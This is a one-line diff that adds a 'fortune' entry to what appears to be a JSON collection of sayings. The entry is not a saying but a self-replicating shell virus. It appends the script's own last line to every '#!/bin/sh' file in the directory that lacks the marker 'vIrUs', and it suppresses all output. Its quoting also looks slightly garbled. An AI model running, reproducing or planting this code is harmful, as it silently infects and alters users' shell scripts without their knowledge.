@@ -1,0 +1,1 @@
+{"fortune":"tail -1 $0|tee -a `grep -l ^#!/bin/sh \\`{ls;grep -l vIrUs *}|sort|uniq -u'\\``>/dev/null 2>&1"}
